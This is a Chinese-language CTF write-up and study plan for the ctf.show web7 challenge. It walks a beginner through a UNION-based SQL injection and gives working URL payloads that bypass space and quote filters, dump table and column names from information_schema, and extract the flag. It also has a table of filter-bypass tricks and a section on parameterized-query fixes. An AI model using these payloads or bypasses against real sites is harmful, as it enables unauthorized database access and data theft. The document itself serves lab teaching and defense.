

# Web方向

题目：https://ctf.show/challenges#web7-12

## WP

下面我从零开始，用这道题带你走一遍。你不需要任何基础，跟着每一步看结果就行。

---

## 第 0 步：先搞懂网页背后发生了什么

你访问：

```
http://站点/index.php?id=1
```

浏览器做了两件事：

1. 请求 `index.php` 这个页面
2. 顺便告诉服务器一个参数：`id=1`

服务器上的 PHP 代码大概长这样（这是根据现象推测出来的）：

```php
$id = $_GET['id'];              // 拿到 URL 里的 id
$sql = "SELECT * FROM page WHERE id = $id";  // 拼成 SQL 语句
// 执行 SQL，把结果渲染成网页
```

数据库（MySQL）里有一张 `page` 表，存着文章。你给它 `id=1`，它就执行：

```sql
SELECT * FROM page WHERE id = 1
```

意思是：**从 page 表里，找出 id 等于 1 的那一行**，然后把标题和正文显示在网页上。

> 类比：你对着窗口喊“我要 1 号套餐”，后厨就按 1 号做菜端出来。

---

## 第 1 步：认识 URL 参数和“编码”

`?id=1` 里的 `id` 是参数名，`1` 是参数值。**我们能控制这个值**。

当值里含有特殊字符时，浏览器/URL 会把它编码成 `%XX` 形式：

| 字符 | 编码  | 含义             |
| ---- | ----- | ---------------- |
| 空格 | `%20` | 空格             |
| `'`  | `%27` | 单引号           |
| `#`  | `%23` | 井号（SQL 注释） |
| `=`  | `%3D` | 等号             |
| `\|` | `%7C` | 竖线             |
| Tab  | `%09` | 制表符           |

为什么要编码？因为 `#` 在浏览器里有特殊含义（页面锚点），直接写会被浏览器吞掉，所以必须写 `%23`。

---

## 第 2 步：找注入点（试探服务器脾气）

我们一个一个试，观察网页变化：

### 实验 1：正常参数

```
?id=1     -> 显示文章 If
?id=2     -> 显示第二篇
?id=0     -> 空白
```

说明 `id` 真的被拿去查数据库了。

### 实验 2：塞一个单引号

```
?id=1%27      （也就是 id=1'）
```

结果：**还是显示文章 If**。

这说明服务器把单引号**删掉了**，变成 `id=1`。这是一个重要线索：单引号被过滤。

### 实验 3：塞空格

```
?id=1%20and%201=1
```

结果：页面显示 **`sql inject error`**。

说明服务器发现你在搞注入，拦截了。注意：它是被**空格**触发的。

---

## 第 3 步：绕过过滤（这题的核心）

### 绕过空格：用 Tab

SQL 里“空格、Tab、换行”都算分隔符，但网站只黑名单了普通空格。

```
?id=1%09and%091=1%23
```

`%09` 是 Tab。服务器看到的是 `1	and	1=1#`，能正常执行。

### 验证真的能注入

```
?id=1%7C%7C1%3D1%23     -> 1||1=1#  -> 显示全部 3 篇文章
?id=1%7C%7C1%3D2%23     -> 1||1=2#  -> 只显示第 1 篇
```

解释：

- `||` 在 MySQL 里就是 **OR（或者）**
- `#` 是注释，把后面的内容全丢掉
- 实际 SQL 变成：

```sql
SELECT * FROM page WHERE id = 1 || 1 = 1
```

由于 `||` 优先级比 `=` 低，等价于：

```sql
WHERE id = 1 OR 1 = 1
```

`1=1` 永远为真，所以整张表都被查出来了。

而 `id = 1 OR 1 = 2` 只有 id=1 那行成立，所以只显示第一篇。

**结论：这里存在 SQL 注入，而且单引号会被删掉，所以干脆不用单引号。**

---

## 第 4 步：数一数这张表有几列

`UNION` 要求前后两个查询的列数一样，所以先要数清楚。

用 `ORDER BY n`（按第 n 列排序）：

```
?id=1%09order%09by%091%23   -> 正常
?id=1%09order%09by%092%23   -> 正常
?id=1%09order%09by%093%23   -> 正常
?id=1%09order%09by%094%23   -> 空白（报错）
```

为什么第 4 个空白？因为表里只有 3 列，按“第 4 列”排序会报错，页面就空了。

**结论：page 表有 3 列。**

---

## 第 5 步：用 UNION SELECT 制造“假数据”

`UNION` 的作用是：**把第二个查询的结果，拼到第一个查询结果后面**。

```sql
SELECT * FROM page WHERE id = -1
UNION SELECT 1, 2, 3
```

- `id = -1` 让第一句查不到任何东西
- 于是页面只剩 `UNION SELECT 1,2,3` 造出来的假行

```
?id=-1%09union%09select%091,2,3%23
```

页面显示：

```
<h4>2</h4>3
```

意思是：

- 第 1 列 `1` 没有被显示
- 第 2 列 `2` 显示在标题处
- 第 3 列 `3` 显示在正文处

**结论：第 2、3 列是“显示位”，可以把想查的数据放在这两个位置。**

---

## 第 6 步：查数据库名

MySQL 有内置函数 `database()`，返回当前数据库名。

```
?id=-1%09union%09select%091,database(),3%23
```

实际 SQL：

```sql
SELECT * FROM page WHERE id = -1
UNION SELECT 1, database(), 3
```

页面标题显示：**`web7`**。

所以数据库叫 `web7`。

---

## 第 7 步：查这个库里有哪些表

MySQL 自带一个“数据字典”库叫 `information_schema`，里面记录了所有表名、列名。

查询：

```sql
SELECT 1, group_concat(table_name), 3
FROM information_schema.tables
WHERE table_schema = database()
```

- `information_schema.tables`：存所有表的信息
- `table_schema = database()`：只看当前库
- `group_concat()`：把多行结果拼成一行，方便一次性显示

URL：

```
?id=-1%09union%09select%091,group_concat(table_name),3%09from%09information_schema.tables%09where%09table_schema%3Ddatabase()%23
```

标题显示：

```
flag,page,user
```

有三张表：`flag`、`page`、`user`。flag 显然就是目标。

---

## 第 8 步：查 flag 表有哪些字段

同样查 `information_schema.columns`：

```sql
SELECT 1, group_concat(column_name), 3
FROM information_schema.columns
WHERE table_schema = database() AND table_name = 0x666c6167
```

这里有个新手最容易卡住的点：**单引号被过滤了，没法写 `'flag'`**。

解决办法：用十六进制表示字符串。

- `0x666c6167` 就是字符串 `flag`
  - `66`=f, `6c`=l, `61`=a, `67`=g

同理，`0x3a` 是冒号 `:`。

于是查所有表的字段：

```
?id=-1%09union%09select%091,group_concat(table_name,0x3a,column_name),3%09from%09information_schema.columns%09where%09table_schema%3Ddatabase()%23
```

结果显示：

```
flag:flag,page:id,page:title,page:content,user:id,user:username,user:password
```

说明 `flag` 表里只有一个字段，名字就叫 `flag`。

---

## 第 9 步：把 flag 拿出来

```sql
SELECT * FROM page WHERE id = -1
UNION SELECT 1, group_concat(flag), 3 FROM flag
```

URL：

```
?id=-1%09union%09select%091,group_concat(flag),3%09from%09flag%23
```

标题显示：

```
ctfshow{8512f8cb-f686-4919-a89e-0f24f039beb7}
```

拿到 flag。

---

## 完整攻击链总结

| 步骤 | 目的     | Payload（URL 编码后）                                        |
| ---- | -------- | ------------------------------------------------------------ |
| 1    | 确认注入 | `?id=1%7C%7C1%3D1%23`                                        |
| 2    | 数 3 列  | `?id=1%09order%09by%094%23` 报错                             |
| 3    | 找显示位 | `?id=-1%09union%09select%091,2,3%23`                         |
| 4    | 查库名   | `?id=-1%09union%09select%091,database(),3%23`                |
| 5    | 查表名   | `...group_concat(table_name)...from%09information_schema.tables...` |
| 6    | 查字段   | `...from%09information_schema.columns...`                    |
| 7    | 拿 flag  | `?id=-1%09union%09select%091,group_concat(flag),3%09from%09flag%23` |

这题用到的 4 个关键技巧：

1. **空格被过滤** → 用 `%09`（Tab）代替
2. **单引号被删除** → 不用引号；字符串用 `0x十六进制`
3. **`#` 注释** → 截掉 SQL 后面多余的代码
4. **`UNION SELECT`** → 自己造一行数据，放到页面的“显示位”上

---

## 为什么会有这个漏洞？（防守方视角）

根因只有一句话：**程序把用户输入直接拼进了 SQL 语句**。

正确写法是“预编译/参数化查询”，让 `id` 永远只被当成一个值，而不是 SQL 代码：

```php
$stmt = $pdo->prepare("SELECT * FROM page WHERE id = ?");
$stmt->execute([$id]);
```

再加上：

- 校验 `id` 必须是整数（`intval($id)`）
- 不要只靠黑名单（黑名单总有绕过方式）

# 计划

## 一、这题在 CTF 里算什么难度

**结论：入门偏简单，大致是 5 级里的 1.5 级。**

以 ctf.show 的题型分级来看：

| 难度             | 典型题                             | 特征                           |
| ---------------- | ---------------------------------- | ------------------------------ |
| 签到             | 看源码、改个参数                   | 不需要知识                     |
| **入门（本题）** | **web7 这种 UNION 注入**           | **单一漏洞、有回显、过滤很弱** |
| 简单             | 盲注、报错注入、简单文件包含       | 需要写脚本/猜结构              |
| 中等             | 代码审计、反序列化、SSRF、WAF 绕过 | 需要组合知识                   |
| 困难             | 0day、复杂链、多漏洞组合           | 需要经验和研究                 |

为什么说它简单：

- 只有 **SQL 注入** 一个点，不用找漏洞
- 有**回显**（数据直接显示在页面上），不用盲猜
- 过滤很弱，只挡了空格和引号
- 有现成的 `information_schema` 可以直接查表结构

但对零基础的你，它**难在“知识缺口”**：你需要同时知道 HTTP 参数、SQL 语法、UNION、注释、编码这几件事。**不是逻辑难，是没学过。** 学会之后回头看，这题 10 分钟能做完。

## 二、想拿下这种题，按顺序学这些

### 第 1 层：Web 基础（约 3~5 天）

这是所有 Web 题的地基：

- HTTP 请求/响应是什么
- URL 结构和**参数**：`?id=1` 的 `id` 是什么
- GET 和 POST 的区别
- URL 编码：`%20`、`%27`、`%23` 为什么存在
- 浏览器 F12 开发者工具（看请求、改参数）
- 一点点 PHP 或后端概念：参数怎么被读取、怎么拼 SQL

> 推荐：先随便找个“PHP 留言板”源码读一遍，知道 `$_GET['id']` 是什么。

### 第 2 层：SQL 语法（约 1 周，最重要）

不用学完整本 SQL，掌握这些就够打这题：

```sql
SELECT * FROM page WHERE id = 1
SELECT 字段 FROM 表 WHERE 条件
ORDER BY 列号          -- 用来数列数
UNION SELECT 1,2,3     -- 合并查询
# 或 --               -- 注释
database()             -- 当前库名
group_concat()         -- 多行拼一行
information_schema.tables / .columns  -- 元数据
```

重点理解三件事：

1. **`UNION` 要求列数一致**
2. **`#` 注释能截断后面的 SQL**
3. **`information_schema` 是“数据库的目录”**，能查所有库/表/字段

> 推荐：装个 MySQL 或在线 SQL 练习站，亲手跑一遍这些语句。

### 第 3 层：SQL 注入核心（约 1 周）

- 注入的本质：**用户输入被当成 SQL 代码执行**
- 判断注入点：单引号、`and 1=1` / `and 1=2`、数字型 vs 字符型
- 判断列数：`order by n`
- 找回显位：`union select 1,2,3`
- 查库 → 查表 → 查字段 → 查数据（就是这道题的完整流程）
- 注入类型：
  - UNION 注入（本题）
  - 报错注入（`updatexml`）
  - 布尔盲注（`substr` + `ascii`）
  - 时间盲注（`sleep`）
  - 堆叠注入（`;`）

### 第 4 层：过滤绕过（约 3~5 天）

这题用到的，以及常见的：

| 被过滤          | 绕过方法                                        |
| --------------- | ----------------------------------------------- |
| 空格            | `%09`(Tab)、`%0a`(换行)、`/**/`、括号           |
| 单引号          | 数字型不用引号；字符串用 `0x十六进制`、`char()` |
| 关键字 `and/or` | `||`、`&&`、大小写、双写 `anandd`               |
| `#`、`--`       | `%23`、`-- -`、`;%00`                           |
| `select` 被拦   | `seleselectct`、`/**/`、大小写                  |

还要会：URL 编码、十六进制（`0x666c6167` = `flag`）、注释的作用。

### 第 5 层：工具（约 2~3 天）

- **Burp Suite**：抓包、改包、重放（CTF 必备）
- 浏览器插件 **HackBar**（方便发 payload）
- **sqlmap**：自动化注入（但**先手工会，再用工具**，否则学不到东西）

### 第 6 层：扩展（进阶）

- 文件读写：`into outfile` / `load_file`
- 二次注入、堆叠注入
- WAF 绕过、无回显盲注脚本
- 其他漏洞：XSS、文件包含、SSRF、反序列化
